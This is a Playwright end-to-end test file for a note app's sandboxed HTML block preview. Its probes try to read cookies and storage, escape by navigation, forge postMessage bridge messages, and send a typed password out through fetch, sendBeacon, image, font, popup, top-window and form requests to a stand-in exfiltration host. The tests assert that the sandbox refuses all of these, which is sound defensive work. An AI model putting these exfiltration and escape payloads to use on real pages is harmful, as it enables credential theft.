import type { FrameLocator, Locator, Page } from '@playwright/test';
import { test, expect } from '../fixtures';
import { activeEditor, createNote, pastePlainText, screenshotInBothThemes } from '../support/actions';
import { assertTestOrigin } from '../support/origin-guard';

// #389: an `html` code block previews as a running page in a sandboxed frame
// that cannot reach the app, its storage or the network. Every isolation check
// is read from text the block's own script writes into its frame.
//
// #975: a block runs without a click, so the sandbox is what keeps a fake sign-in form
// from sending what was typed in it anywhere. Each way out, and the test that closes it:
// - same origin (the app's storage, cookies, DOM): "the frame cannot reach the network, storage, ..."
//   and `sandbox="allow-scripts"` alone in "its inline script runs in the frame ..."
// - fetch, XHR, sendBeacon (CSP connect-src): "a fake sign-in form gets nothing out ..."
// - image beacons and remote fonts (CSP img-src, font-src): the same test, and "an external image does not load"
// - a form submit to a URL (no allow-forms, CSP form-action): the same test
// - a popup or a new tab (no allow-popups, so no allow-popups-to-escape-sandbox): the same test
// - navigating the top window (no allow-top-navigation): the same test
// - navigating its own frame (location.href, a meta refresh, a target=_self link; the app's
//   frame-src): "... sends nothing off the machine"
// - a link the block's script clicks: "a link the block's script clicks opens no tab ..."
// - a link the user clicks: it shows its URL first when the user may not have written the
//   block (e2e/editor/live-block-links.spec.ts)
// Not closed here: WebRTC (RTCPeerConnection ICE/STUN) is outside CSP connect-src.

// One line, so typing it never leaves the code block.
const PROBE = [
  '<style>body { font-family: system-ui; }</style>',
  '<p id="ran"></p><pre id="out"></pre><img id="img" src="https://example.com/x.png">',
  '<script>',
  "const out = document.getElementById('out');",
  "const report = (name, result) => { out.textContent += name + ': ' + result + '\\n'; };",
  // A read that succeeds prints what it got, so a leak shows up in the failure message.
  "const attempt = (name, read) => { try { report(name, 'readable ' + JSON.stringify(read())); } catch (e) { report(name, 'threw ' + e.name); } };",
  "document.getElementById('ran').textContent = 'script ran';",
  "attempt('localStorage', () => localStorage.getItem('e2e-secret'));",
  "attempt('parent.document', () => parent.document.title);",
  "attempt('cookie', () => document.cookie);",
  "fetch('https://example.com').then(() => report('fetch', 'resolved'), () => report('fetch', 'rejected'));",
  "const img = document.getElementById('img');",
  "const imgDone = () => report('img', 'naturalWidth ' + img.naturalWidth);",
  'if (img.complete) imgDone(); else img.onload = img.onerror = imgDone;',
  '</script>',
].join('');

// #412: a page exactly 900px tall, with a button that makes it 400px taller. One line too.
const TALL = [
  '<style>body { margin: 0; font-family: system-ui; } #tall { box-sizing: border-box; height: 900px; padding: 24px; border: 4px dashed #999; }</style>',
  '<div id="tall"><h2>A page 900px tall</h2>',
  '<button onclick="tall.style.height = tall.offsetHeight + 400 + \'px\'">Grow by 400px</button></div>',
].join('');

// #409: a block may also load scripts, styles and fonts from three CDN hosts. The same
// source goes in every way a block can (typed, pasted bare, pasted as a fence; an agent's
// write is in agentEditEngine.test.ts): a script from an allowlisted host, an inline
// script that uses it, and a div it fills in.
const CDN_SCRIPT_URL = 'https://cdn.jsdelivr.net/npm/probe.js';
const OTHER_HOST_SCRIPT_URL = 'https://example.com/x.js';
const CDN_SOURCE = [
  '<div id="out">waiting for the CDN script</div>',
  `<script src="${CDN_SCRIPT_URL}"></script>`,
  '<script>',
  "document.getElementById('out').textContent = window.cdnProbe();",
  '</script>',
].join('\n');

// What the block's CSP still refuses: a script from any other host, and fetch even to an allowlisted one.
const CDN_LIMITS = [
  '<pre id="out"></pre>',
  `<script src="${CDN_SCRIPT_URL}"></script>`,
  `<script src="${OTHER_HOST_SCRIPT_URL}"></script>`,
  '<script>',
  "const report = (name, result) => { document.getElementById('out').textContent += name + ': ' + result + '\\n'; };",
  "report('allowlisted host', window.cdnProbe ? window.cdnProbe() : 'did not run');",
  "report('other host', window.otherHostRan ? 'ran' : 'did not run');",
  `fetch('${CDN_SCRIPT_URL}').then(() => report('fetch', 'resolved'), () => report('fetch', 'rejected'));`,
  '</script>',
].join('\n');

/**
 * Answers both script URLs with a fake, and returns the requests that got that far, as
 * `<resource type> <url>`. Routes added after the fixture's network fence run before it,
 * so only these two URLs are answered and every other request still meets the fence.
 * Each answer carries what the frame needs to use it (CORP for the COEP it inherits from
 * the app, CORS for fetch), so whatever fails to run or resolve was refused by the CSP.
 */
async function serveFakeScripts(app: Page): Promise<string[]> {
  const requests: string[] = [];
  const serve = (url: string, body: string) =>
    app.context().route(url, (route) => {
      requests.push(`${route.request().resourceType()} ${url}`);
      return route.fulfill({
        contentType: 'text/javascript',
        headers: { 'Cross-Origin-Resource-Policy': 'cross-origin', 'Access-Control-Allow-Origin': '*' },
        body,
      });
    });
  await serve(CDN_SCRIPT_URL, "window.cdnProbe = () => 'cdn script ran';");
  await serve(OTHER_HOST_SCRIPT_URL, 'window.otherHostRan = true;');
  return requests;
}

/** Creates a note with `source` as an `html` block, previews it, and returns its frame. */
async function previewProbe(app: Page, source = PROBE) {
  await createNote(app, { title: `Html ${Date.now()}`, body: '```html ' + source });
  // Something on the app's origin for the frame to fail to read.
  await assertTestOrigin(app);
  await app.evaluate(() => {
    document.cookie = 'e2e-secret=cookie-value';
    localStorage.setItem('e2e-secret', 'storage-value');
  });
  await app.getByRole('button', { name: 'Preview', exact: true }).click();
  return activeEditor(app).frameLocator('iframe[title="HTML preview"]');
}

/** The box an html block's frame fills: the element that carries the block's height. */
const resizableBox = (app: Page) => activeEditor(app).locator('[data-live-block-preview="html"]');

/** Drags the box's native resize handle (its bottom right corner) down by `dy` pixels. */
async function dragResizeHandle(app: Page, resizable: Locator, dy: number): Promise<void> {
  const box = (await resizable.boundingBox())!;
  await app.mouse.move(box.x + box.width - 4, box.y + box.height - 4);
  await app.mouse.down();
  await app.mouse.move(box.x + box.width - 4, box.y + box.height - 4 + dy, { steps: 5 });
  await app.mouse.up();
}

/**
 * Starts listening on the app page for a height report of at least `min`, whoever
 * sends it. The returned function resolves once one was delivered: by then the
 * app's own handler has had the same message, so "nothing changed" is not a race.
 */
async function listenForHeightReport(app: Page, min: number): Promise<() => Promise<void>> {
  const listening = await app.evaluateHandle(
    (min) => ({
      delivered: new Promise<void>((resolve) => {
        window.addEventListener('message', function onMessage(event: MessageEvent<{ height?: number } | null>) {
          if ((event.data?.height ?? 0) < min) return;
          window.removeEventListener('message', onMessage);
          resolve();
        });
      }),
    }),
    min,
  );
  return () => listening.evaluate(({ delivered }) => delivered);
}

/**
 * Resolves once the app has handled what `frame` has reported so far: the frame's size
 * observers run after two animation frames at the latest, and the app answers a port's
 * messages in order, so by the reply to this request it has seen the height report.
 */
const reportsHandled = (frame: FrameLocator) =>
  frame.locator('html').evaluate(async () => {
    await new Promise(requestAnimationFrame);
    await new Promise(requestAnimationFrame);
    await (window as unknown as { journal: { storage: { get(key: string): Promise<unknown> } } }).journal.storage.get('none');
  });

/** Records the app's enforced CSP blocking something, as `<directive> <url>`. */
async function collectBlockedByCsp(app: Page): Promise<() => Promise<string[]>> {
  const blocked = await app.evaluateHandle(() => {
    const seen: string[] = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      if (event.disposition === 'enforce') seen.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
    return seen;
  });
  return () => blocked.evaluate((seen) => seen);
}

test("html block: its inline script runs in the frame under the app's COEP headers", async ({ reusedApp: app }) => {
  // True only when the page was served with COOP same-origin + COEP require-corp.
  expect(await app.evaluate(() => window.crossOriginIsolated)).toBe(true);

  const frame = await previewProbe(app);
  await expect(frame.locator('#ran')).toHaveText('script ran');

  const iframe = activeEditor(app).locator('iframe[title="HTML preview"]');
  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts');

  // As tall as its content (#412) once the probe has written all its lines, and the
  // native resize handle is reachable over the frame.
  await expect(frame.locator('#out')).toContainText('fetch: rejected');
  await expect(frame.locator('#out')).toContainText('img: naturalWidth 0');
  // Less the frame's bleed: 12px of padding above and below its content.
  const fitted = await frame.locator('html').evaluate((html) => Math.ceil(html.getBoundingClientRect().height) - 24);
  const resizable = iframe.locator('..');
  await expect(resizable).toHaveCSS('height', `${fitted}px`);
  await dragResizeHandle(app, resizable, 100);
  await expect(resizable).toHaveCSS('height', `${fitted + 100}px`);
});

test('html block: the frame cannot reach the network, storage, the parent document or cookies', async ({ reusedApp: app }) => {
  const frame = await previewProbe(app);
  const out = frame.locator('#out');

  // Blocked by the frame's CSP before a request exists: had one reached the
  // network layer, the fixture's network fence would fail this test on teardown.
  await expect(out).toContainText('fetch: rejected');
  await expect(out).toContainText('localStorage: threw SecurityError');
  await expect(out).toContainText('parent.document: threw SecurityError');
  // Chromium does not hand a sandboxed (opaque-origin) document an empty cookie
  // string: the read itself throws. Either way the app's cookie is out of reach.
  await expect(out).toContainText('cookie: threw SecurityError');
  await expect(out).not.toContainText('readable');

  // The app itself still has both, so the checks above were not vacuous.
  expect(await app.evaluate(() => document.cookie)).toContain('e2e-secret=cookie-value');
  expect(await app.evaluate(() => localStorage.getItem('e2e-secret'))).toBe('storage-value');

  // The page's first script took the token that opens the bridge out of the document with it (#945).
  expect(await frame.locator('html').evaluate((html) => html.outerHTML)).not.toContain('MessageChannel');
});

// #945: a block must not leave its page for a URL of its choice. No click is needed.
const ESCAPE_URL = 'https://example.com/escape?state=secret';

for (const [how, source] of [
  ['location.href', `<script>location.href = '${ESCAPE_URL}';</script>`],
  ['a meta refresh', `<meta http-equiv="refresh" content="0;url=${ESCAPE_URL}">`],
  // Stopped on the way up: the link bridge never sees this click.
  [
    'a link with target=_self',
    `<a id="go" target="_self" href="${ESCAPE_URL}">Go</a><script>const go = document.getElementById('go'); go.onclick = (event) => event.stopPropagation(); go.click();</script>`,
  ],
] as const) {
  test(`html block: ${how} sends nothing off the machine`, async ({ reusedApp: app }) => {
    const requests: string[] = [];
    await app.context().route(ESCAPE_URL, (route) => {
      requests.push(route.request().url());
      return route.fulfill({ contentType: 'text/html', body: 'escaped' });
    });
    const blocked = await collectBlockedByCsp(app);

    await previewProbe(app, source);

    await expect.poll(blocked).toEqual([`frame-src ${new URL(ESCAPE_URL).origin}`]);
    expect(requests).toEqual([]);
  });
}

test('html block: a page navigated to in the frame gets no answer from the app', async ({ reusedApp: app }) => {
  // On the app's origin, which frame-src allows: this is what any other page would get if the CSP were not there.
  const escapeUrl = new URL('/e2e-escape', app.url()).href;
  await app.context().route(escapeUrl, (route) =>
    route.fulfill({
      contentType: 'text/html',
      headers: { 'Cross-Origin-Embedder-Policy': 'require-corp', 'Cross-Origin-Resource-Policy': 'cross-origin' },
      body: [
        '<!doctype html><pre id="out">asked</pre><script>',
        "const out = document.getElementById('out');",
        "const report = (event) => { out.textContent += ' answered ' + JSON.stringify(event.data); };",
        "addEventListener('message', report);",
        'const channel = new MessageChannel();',
        'channel.port1.onmessage = report;',
        // The old bridge on the window, and a port offered with a guess at the token.
        "parent.postMessage({ journalLiveBlock: 1, storage: 'get', request: 1, key: 'secret' }, '*');",
        "parent.postMessage({ journalLiveBlock: 1, bridge: 'guess' }, '*', [channel.port2]);",
        "channel.port1.postMessage({ journalLiveBlock: 1, storage: 'get', request: 2, key: 'secret' });",
        "parent.postMessage({ journalLiveBlock: 1, height: 5000 }, '*');",
        '</script>',
      ].join(''),
    }),
  );
  const asked = await listenForHeightReport(app, 5000);

  const frame = await previewProbe(
    app,
    `<p id="ran">saving</p><script>journal.storage.set('secret', 'state').then(() => { location.href = '${escapeUrl}'; });</script>`,
  );

  await asked();
  await expect(frame.locator('#out')).toHaveText('asked');
  // A reply to the window would be in the frame's queue by now: the app answered in the message's own task.
  await frame.locator('html').evaluate(() => new Promise((resolve) => setTimeout(resolve)));
  await expect(frame.locator('#out')).toHaveText('asked');
  await expect(resizableBox(app)).not.toHaveCSS('height', '1600px');
});

test('html block: a clicked web link opens in a new tab, and the frame stays put', async ({ reusedApp: app }) => {
  const url = 'https://example.com/linked';
  // Answered here, so the new tab never meets the fixture's network fence.
  await app.context().route(url, (route) => route.fulfill({ contentType: 'text/html', body: 'linked page' }));
  const frame = await previewProbe(app, `<p id="ran">ready</p><a href="${url}">Open</a>`);
  await expect(frame.locator('#ran')).toHaveText('ready');

  const [tab] = await Promise.all([app.context().waitForEvent('page'), frame.getByRole('link', { name: 'Open' }).click()]);
  await expect(tab).toHaveURL(url);
  // The block's page did not navigate away.
  await expect(frame.locator('#ran')).toHaveText('ready');
});

// #947: a fake "Sign in" button whose script clicks a hidden link it filled in. The user's click
// gives the page activation, but the link's click is the script's, so no tab opens for it.
test("html block: a link the block's script clicks opens no tab, a link the user clicks does", async ({ reusedApp: app }) => {
  const scripted = 'https://example.com/scripted';
  const clicked = 'https://example.com/clicked';
  const requested: string[] = [];
  for (const url of [scripted, clicked]) {
    await app.context().route(url, (route) => {
      requested.push(url);
      return route.fulfill({ contentType: 'text/html', body: 'linked page' });
    });
  }
  const frame = await previewProbe(
    app,
    `<p id="ran">ready</p><button id="go">Sign in</button><a id="s" hidden href="${scripted}">s</a><a href="${clicked}">Open</a>` +
      "<script>document.getElementById('go').onclick = () => { document.getElementById('s').click(); document.getElementById('ran').textContent = 'clicked'; };</script>",
  );
  await expect(frame.locator('#ran')).toHaveText('ready');

  await frame.getByRole('button', { name: 'Sign in' }).click();
  await expect(frame.locator('#ran')).toHaveText('clicked');
  // The app handles the frame's messages in order: had it been sent the scripted link, its tab would be open first.
  const [tab] = await Promise.all([app.context().waitForEvent('page'), frame.getByRole('link', { name: 'Open' }).click()]);
  await expect(tab).toHaveURL(clicked);
  await tab.close();
  expect(requested).toEqual([clicked]);
  // The block's page did not navigate away either.
  await expect(frame.locator('#ran')).toHaveText('clicked');
});

// #975: everything a block's script can try with what the reader typed, at once. The frame's own
// CSP reports what it refused; the sandbox makes window.open return null and the top window throw.
// One line too.
const EXFIL = 'https://example.com/exfil';
const EXFIL_PROBE = [
  `<pre id="out"></pre><form id="f" action="${EXFIL}/form" method="get"><input name="pw" value="hunter2"></form>`,
  `<style>@font-face { font-family: probe; src: url(${EXFIL}/font.woff2?pw=hunter2); } pre { font-family: probe, monospace; }</style>`,
  '<script>',
  "const out = document.getElementById('out');",
  "const report = (name, result) => { out.textContent += name + ': ' + result + '\\n'; };",
  "addEventListener('securitypolicyviolation', (event) => report('csp', event.effectiveDirective));",
  `fetch('${EXFIL}/fetch?pw=hunter2').then(() => report('fetch', 'resolved'), () => report('fetch', 'rejected'));`,
  `try { navigator.sendBeacon('${EXFIL}/beacon?pw=hunter2', 'hunter2'); } catch (e) { report('sendBeacon', 'threw ' + e.name); }`,
  `new Image().src = '${EXFIL}/pixel.gif?pw=hunter2';`,
  `new FontFace('probe2', 'url(${EXFIL}/font2.woff2?pw=hunter2)').load().then(() => report('font', 'loaded'), () => report('font', 'refused'));`,
  `report('popup', window.open('${EXFIL}/popup?pw=hunter2') === null ? 'blocked' : 'opened');`,
  `try { top.location.href = '${EXFIL}/top?pw=hunter2'; report('top', 'navigated'); } catch (e) { report('top', 'threw ' + e.name); }`,
  "document.getElementById('f').submit();",
  // Had the submit left the page, this would never report.
  "setTimeout(() => report('form', 'stayed'), 500);",
  '</script>',
].join('');

test('html block: a fake sign-in form gets nothing out: fetch, beacons, fonts, a form, a popup and the top window are refused', async ({ reusedApp: app }) => {
  const requests: string[] = [];
  await app.context().route(`${EXFIL}/**`, (route) => {
    requests.push(route.request().url());
    return route.fulfill({ contentType: 'text/html', headers: { 'Cross-Origin-Resource-Policy': 'cross-origin' }, body: 'escaped' });
  });
  const pages: string[] = [];
  const onPage = (page: Page) => pages.push(page.url());
  app.context().on('page', onPage);

  const frame = await previewProbe(app, EXFIL_PROBE);
  const out = frame.locator('#out');

  await expect(out).toContainText('fetch: rejected');
  await expect(out).toContainText('font: refused');
  await expect(out).toContainText('popup: blocked');
  await expect(out).toContainText('top: threw SecurityError');
  await expect(out).toContainText('form: stayed');
  for (const directive of ['connect-src', 'img-src', 'font-src']) await expect(out).toContainText(`csp: ${directive}`);
  // Scripts only: no same origin, forms, popups (so none that escape the sandbox) or top navigation.
  await expect(activeEditor(app).locator('iframe[title="HTML preview"]')).toHaveAttribute('sandbox', 'allow-scripts');

  app.context().off('page', onPage);
  // The app stays on its own origin: the top window was never sent to the exfil host.
  expect(new URL(app.url()).origin).not.toBe(new URL(EXFIL).origin);
  expect(pages).toEqual([]);
  expect(requests).toEqual([]);
});

test('html block: an external image does not load', async ({ reusedApp: app }) => {
  const frame = await previewProbe(app);

  await expect(frame.locator('#out')).toContainText('img: naturalWidth 0');
  await expect(frame.locator('#img')).toHaveJSProperty('naturalWidth', 0);
});

test('html block: typed, a script from an allowlisted CDN host runs', async ({ reusedApp: app }) => {
  const requests = await serveFakeScripts(app);
  const frame = await previewProbe(app, CDN_SOURCE);

  await expect(frame.locator('#out')).toHaveText('cdn script ran');
  expect(new Set(requests)).toEqual(new Set([`script ${CDN_SCRIPT_URL}`]));
});

for (const [how, pasted] of [
  ['bare markup', CDN_SOURCE],
  ['a whole html fence', '```html\n' + CDN_SOURCE + '\n```'],
] as const) {
  test(`html block: pasted as ${how}, it opens in Preview and the CDN script runs`, async ({ reusedApp: app }) => {
    const requests = await serveFakeScripts(app);
    await createNote(app, { title: `Html paste ${Date.now()}`, body: 'Intro' });
    await app.keyboard.press('Enter');
    await pastePlainText(app, pasted);

    // Nobody clicked Preview: the pasted block opens in it.
    const block = activeEditor(app).locator('[data-live-block="html"]');
    await expect(block.getByRole('button', { name: 'Preview', exact: true })).toHaveAttribute('aria-pressed', 'true');
    await expect(block.frameLocator('iframe[title="HTML preview"]').locator('#out')).toHaveText('cdn script ran');
    expect(new Set(requests)).toEqual(new Set([`script ${CDN_SCRIPT_URL}`]));
    // The block holds the source as pasted; none of it was left behind as literal text.
    expect(await block.locator('pre').textContent()).toBe(CDN_SOURCE);
    await expect(activeEditor(app).locator('p', { hasText: '<' })).toHaveCount(0);
    await expect(activeEditor(app)).not.toContainText('```');
  });
}

test('html block: a script from any other host does not run, and fetch to an allowlisted host rejects', async ({ reusedApp: app }) => {
  const requests = await serveFakeScripts(app);
  const frame = await previewProbe(app, CDN_LIMITS);
  const out = frame.locator('#out');

  await expect(out).toContainText('allowlisted host: cdn script ran');
  await expect(out).toContainText('other host: did not run');
  await expect(out).toContainText('fetch: rejected');
  // The CSP refused both before a request existed: the only one made was for the allowlisted script.
  expect(new Set(requests)).toEqual(new Set([`script ${CDN_SCRIPT_URL}`]));
});

test('html block: is as tall as its content and grows with it, until the user resizes it', async ({ reusedApp: app }) => {
  // Tall enough that the resize handle of a grown block is on screen.
  await app.setViewportSize({ width: 1280, height: 1800 });
  const frame = await previewProbe(app, TALL);
  const resizable = resizableBox(app);
  const grow = frame.getByRole('button', { name: 'Grow by 400px' });

  // Nobody resized it: the block took its content's height, and follows it.
  await expect(resizable).toHaveCSS('height', '900px');
  // The frame also covers the box's 12px bleed above and below.
  await expect(resizable.locator('iframe')).toHaveCSS('height', '924px');
  await grow.click();
  await expect(resizable).toHaveCSS('height', '1300px');

  // A height the user drags the block to wins over what the content reports next.
  await dragResizeHandle(app, resizable, -100);
  await expect(resizable).toHaveCSS('height', '1200px');
  await grow.click();
  await reportsHandled(frame);
  await expect(resizable).toHaveCSS('height', '1200px');
});

test('html block: a height report posted by the app page itself changes no block', async ({ reusedApp: app }) => {
  await previewProbe(app, TALL);
  const resizable = resizableBox(app);
  await expect(resizable).toHaveCSS('height', '900px');

  // The right marker and a number, but not from the block's frame.
  const delivered = await listenForHeightReport(app, 5000);
  await app.evaluate(() => window.postMessage({ journalLiveBlock: 1, height: 5000 }, '*'));
  await delivered();
  await expect(resizable).toHaveCSS('height', '900px');
});

// #424: no full screen. The block is as tall as its content and lives in the note.
// One run; the screenshot is taken in both themes.
test('html block: a 900px page gets a frame of its height and no Full screen control', async ({ reusedApp: app }) => {
  // Tall enough to show the whole 900px block at its natural height.
  await app.setViewportSize({ width: 1280, height: 1200 });

  const frame = await previewProbe(app, TALL);
  const block = activeEditor(app).locator('[data-live-block="html"]');
  const resizable = resizableBox(app);
  await expect(frame.getByRole('heading', { name: 'A page 900px tall' })).toBeVisible();
  await expect(resizable).toHaveCSS('height', '900px');
  // Nothing scrolls inside the frame.
  expect(await frame.locator('html').evaluate((el) => el.scrollHeight - el.clientHeight)).toBe(0);
  await block.hover();
  await expect(block.getByRole('button', { name: /full ?screen/i })).toHaveCount(0);
  // The frame reloads on a theme change; it must come back at the same height.
  await screenshotInBothThemes(
    app,
    (theme) => `html-tall-${theme}-desktop.png`,
    async () => {
      await expect(frame.getByRole('heading', { name: 'A page 900px tall' })).toBeVisible();
      await expect(resizable).toHaveCSS('height', '900px');
    }
  );
});

// One run; the screenshot is taken in both themes.
test('screenshot: running html block', async ({ reusedApp: app }) => {
  await app.setViewportSize({ width: 1280, height: 960 });

  const frame = await previewProbe(app);
  await expect(frame.locator('#out')).toContainText('fetch: rejected');
  await expect(frame.locator('#out')).toContainText('img: naturalWidth 0');

  await screenshotInBothThemes(
    app,
    (theme) => `live-html-block-${theme}-desktop.png`,
    async () => {
      await expect(frame.locator('#out')).toContainText('img: naturalWidth 0');
    }
  );
});
